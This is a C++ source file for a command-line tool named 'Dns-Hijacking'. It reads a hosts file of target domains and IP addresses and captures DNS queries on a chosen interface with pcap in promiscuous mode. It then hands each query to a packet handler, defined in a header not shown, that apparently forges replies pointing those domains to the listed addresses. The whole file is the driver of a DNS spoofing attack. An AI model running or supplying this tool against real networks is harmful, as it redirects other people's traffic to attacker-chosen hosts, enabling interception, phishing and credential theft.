#include "packet_handle.h"

void usage() {
    std::cout << "Systex : Dns-Hijacking <file>\n";
    std::cout << "Sample : Dns-Hijacking hosts\n";
}

int main(int argc, char **argv)
{
    if(argc!=2) {
        usage();
        return -1;
    }

    int i=0;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *d;
    const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";
    struct bpf_program fcode;
    bpf_u_int32 mask;
    packet_handle pkt = packet_handle();

    std::vector<std::pair<std::string, std::string>>target_list = pkt.read_file(argv[1]);
    if(target_list.size() < 0) {
        printf("host is invalid. check the file");
        return -1;
    }

    std::vector<std::string>ip_array = pkt.get_ip_list(target_list);
    std::vector<std::string>domain_array = pkt.get_domain_list(target_list);

    if(pcap_findalldevs(&alldevs, errbuf) < 0) {
        std::cout << "pcap_findalldevs error\n";
        return -1;
    }

    for(d=alldevs; d; d=d->next) {
        printf("%d. %s", ++i, d->name);
        if(d->description) printf(" (%s)", d->description);
        printf("\n");

    }

    printf("Select interface : ");
    scanf("%d", &i);
    for(d=alldevs; i>0; d=d->next, i--);

    pcap_t* handle = pcap_open_live(d->name, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr) {
        fprintf(stderr, "couldn`t open device %s(%s)\n", d->name, errbuf);
        return -1;
    }

    //Filter DNS
    if(pcap_compile(handle, &fcode, filter, 1, mask) == -1) {
        fprintf(stderr, "pcap_compile error\n");
        return -1;
    }
    if(pcap_setfilter(handle, &fcode)==-1) {
        fprintf(stderr, "pcap_setfilter error\n");
        return -1;
    }

    while(1) {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res > 0) {
            char *extract_domain = pkt.make_domain(header, packet);
            pkt.packet_handler(header, packet, extract_domain, domain_array, ip_array);
        }
    }

}
